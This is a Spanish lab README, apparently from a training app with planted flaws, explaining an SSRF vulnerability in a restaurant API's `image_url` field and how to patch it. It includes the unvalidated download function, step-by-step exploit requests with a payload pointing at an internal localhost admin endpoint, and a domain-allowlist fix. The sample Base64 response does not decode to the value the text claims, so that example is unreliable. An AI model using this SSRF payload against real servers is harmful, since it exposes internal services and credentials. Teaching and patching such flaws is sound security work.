

# Level 4: Server Side Request Forgery (SSRF)

## 📌 Inicio Rápido

### Prerequisitos
Asegúrate de tener activado tu entorno virtual de Python:

```bash
source venv/bin/activate
```

### Comandos de Prueba

#### 1️⃣ Ejecutar exploit para ver la vulnerabilidad
```bash
python3 new_parche_proyecto/levels/lvl_4/script/exploit_lvl4.py
```

#### 2️⃣ Aplicar parche de seguridad
```bash
sudo cp new_parche_proyecto/levels/lvl_4/fix/_image_url_to_base64.py app/apis/menu/utils/_image_url_to_base64.py
```

#### 3️⃣ Verificar que la vulnerabilidad fue corregida
```bash
python3 new_parche_proyecto/levels/lvl_4/script/exploit_lvl4.py
```

#### 4️⃣ Revertir parche (opcional)
```bash
sudo cp new_parche_proyecto/levels/lvl_4/unpatch/_image_url_to_base64.py app/apis/menu/utils/_image_url_to_base64.py
```

---

## 📋 Clasificación OWASP
**API10:2023 - Unsafe Consumption of APIs**

## 🎯 Descripción de la Vulnerabilidad

El endpoint `PUT /menu` permite a los usuarios con rol `Employee` (o `Chef`) crear o actualizar ítems del menú. Uno de los campos que se puede proporcionar es `image_url`, donde el servidor descarga una imagen desde la URL especificada y la almacena en formato Base64. La vulnerabilidad radica en que el servidor **no valida el dominio** de la URL proporcionada, permitiendo al atacante inyectar URLs internas o externas arbitrarias.

Esto habilita un ataque de Server Side Request Forgery (SSRF), donde el servidor es forzado a realizar peticiones a recursos que no debería. En este nivel, se explota para acceder a un endpoint oculto `/admin/reset-chef-password` que está restringido a `localhost`, revelando la contraseña del `Chef`.

### El Problema

La función `_image_url_to_base64` en `app/apis/menu/utils.py` descarga ciegamente cualquier URL que se le pase, sin verificar el dominio o el esquema. Esto significa que:

-   ✅ El endpoint está restringido a usuarios `Employee` o `Chef`.
-   ❌ **NO** se valida la URL de la imagen.
-   ❌ Un `Employee` puede hacer que el servidor solicite recursos internos.

El código vulnerable en `app/apis/menu/utils.py` es el siguiente:

```python
# app/apis/menu/utils.py

import requests
import base64

def _image_url_to_base64(image_url: str):
    response = requests.get(image_url, stream=True)
    # No hay validación de dominio o esquema aquí
    encoded_image = base64.b64encode(response.content).decode()
    return encoded_image
```

## 🔓 Cómo se Explota

### Paso 1: Escalar Privilegios (Nivel 3 - BFLA)
El atacante primero necesita una cuenta con rol `Employee` o `Chef`. Si solo tiene una cuenta `Customer`, deberá explotar la vulnerabilidad de BFLA del Nivel 3 para escalar privilegios.

### Paso 2: Autenticación con Rol Elevado
Obtener un token de acceso para el usuario con el rol `Employee` (o `Chef`).

```bash
POST /token
Content-Type: application/x-www-form-urlencoded

username={employee_username}&password={employee_password}
```

### Paso 3: Identificar Endpoint Interno (Oculto)
Se descubre un endpoint sensible y restringido a `localhost`, como `/admin/reset-chef-password`, que al ser accedido devuelve la contraseña del `Chef`.

### Paso 4: Inyectar URL SSRF en `image_url`
El atacante usa el endpoint `PUT /menu` para crear o actualizar un ítem, pero en el campo `image_url` inyecta la URL del endpoint interno `/admin/reset-chef-password`. Dado que el servidor ejecutará esta petición desde sí mismo, bypassa la restricción de `localhost`.

```bash
PUT /menu
Authorization: Bearer {token_employee}
Content-Type: application/json

{
  "name": "Sandwich Cubano",
  "price": 12.0,
  "category": "explotion",
  "image_url": "http://localhost:8091/admin/reset-chef-password",
  "description": ""
}
```

### Paso 5: Extraer la Contraseña del Chef
El servidor intentará "descargar" la "imagen" desde `http://localhost:8091/admin/reset-chef-password`. La respuesta de este endpoint (que contiene la contraseña del `Chef`) será procesada y codificada en Base64. El atacante solo tiene que decodificar el campo `image_base64` de la respuesta del `PUT /menu` para obtener la contraseña.

**Respuesta (fragmento):**
```json
{
  "id": 15,
  "name": "Sandwich Cubano",
  "price": 12.0,
  "category": "explotion",
  "description": "",
  "image_base64": "eyJwYXNzd29yZCI6InpnczU9d1VkNnRPQmRuK01dMTNtbWIyIzRfVmdDTn1CIn0=" 
  // (Base64 codificado de {"password": "new_chef_password"})
}
```
Al decodificar `eyJwYXNzd29yZCI6InpnczU9d1VkNnRPQmRuK01dMTNtbWIyIzRfVmdDTn1CIn0=`, se obtiene `{"password": "new_chef_password"}`.

## 🛡️ Cómo Solucionarlo

### Solución: Validar Dominio de URLs y Restringir a Tipos de Archivo de Imagen

**Código Vulnerable (en `app/apis/menu/utils.py`):**
```python
import requests
import base64

def _image_url_to_base64(image_url: str):
    response = requests.get(image_url, stream=True)
    encoded_image = base64.b64encode(response.content).decode()
    return encoded_image
```

**Código Seguro (en `app/apis/menu/utils.py`):**
```python
import requests
import base64
from urllib.parse import urlparse
from fastapi import HTTPException, status

urlBaseImg = "restaurant.img.com" # Dominio permitido para imágenes

def _image_url_to_base64(image_url: str):
    parseador_url = urlparse(image_url)

    # Solución 1: Validar que el dominio de la URL de la imagen sea el permitido
    if parseador_url.netloc != urlBaseImg:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=f"Solo se admiten imágenes con dominio: {urlBaseImg}"
        )
    
    # Solución 2 (Adicional): Podríamos añadir validación de Content-Type
    # para asegurar que lo que se descarga es realmente una imagen.
    response = requests.get(image_url, stream=True)
    
    # Ejemplo de validación de Content-Type (opcional pero recomendado)
    # if not response.headers['Content-Type'].startswith('image/'):
    #     raise HTTPException(
    #         status_code=status.HTTP_400_BAD_REQUEST,
    #         detail="La URL no apunta a un archivo de imagen válido."
    #     )
    
    encoded_image = base64.b64encode(response.content).decode()
    return encoded_image
```

### Principios de Seguridad Aplicados

1.  **Validación de Entradas**: Siempre validar y sanitizar todas las entradas proporcionadas por el usuario, especialmente URLs y rutas de archivos.
2.  **Least Privilege (Network)**: Restringir las peticiones salientes del servidor a solo los dominios y protocolos necesarios.
3.  **Whitelisting**: Permitir solo dominios específicos para la descarga de imágenes (en lugar de bloquear dominios conocidos como `blacklisting`).
4.  **Defense in Depth**: Combinar la validación de dominio con la verificación del `Content-Type` para asegurar que el contenido descargado sea una imagen.
5.  **Secure by Default**: Las funciones de procesamiento de URLs externas deben ser restrictivas por defecto.

## 🔍 Escenarios de Ataque

### Escenario 1: Exfiltración de Datos Internos
Un atacante podría usar SSRF para acceder a servicios internos de la red (bases de datos, servicios de metadatos de la nube, APIs internas) y exfiltrar información sensible que de otro modo sería inaccesible.

### Escenario 2: Acceso a Servicios Restringidos (Bypass de Firewall/ACL)
Si hay un firewall o una lista de control de acceso que protege servicios internos de acceso directo desde internet, SSRF permite al atacante usar el servidor vulnerable como un proxy para interactuar con esos servicios.

### Escenario 3: Escaneo de Puertos Internos
El atacante puede usar la vulnerabilidad SSRF para escanear puertos en la red interna del servidor, identificando otros servicios y posibles puntos de entrada.

### Escenario 4: Ataques a otros Servicios Externos
Aunque menos común en este contexto, un SSRF podría usarse para atacar otros servicios externos desde la IP del servidor vulnerable, lo que podría dañar la reputación del servidor o causar problemas legales.

## 🔬 Prueba de Concepto

Ejecutar el exploit:
```bash
python new_parche_proyecto/levels/lvl_4/script/exploit_lvl4.py
```

El script:
1.  Registrará un usuario `lvl4_attacker` con rol `Employee`.
2.  Obtendrá un token de autenticación para `lvl4_attacker`.
3.  Realizará una petición `PUT /menu` inyectando la URL interna `http://localhost:8091/admin/reset-chef-password` en el campo `image_url`.
4.  Extraerá y decodificará el campo `image_base64` de la respuesta para obtener la contraseña del `Chef`.
5.  Mostrará si la contraseña fue obtenida exitosamente (vulnerable) o si la petición fue bloqueada (protegida).

## 📚 Referencias

-   OWASP API Security Top 10 2023: API10:2023
-   CWE-918: Server-Side Request Forgery (SSRF)
-   CWE-20: Improper Input Validation


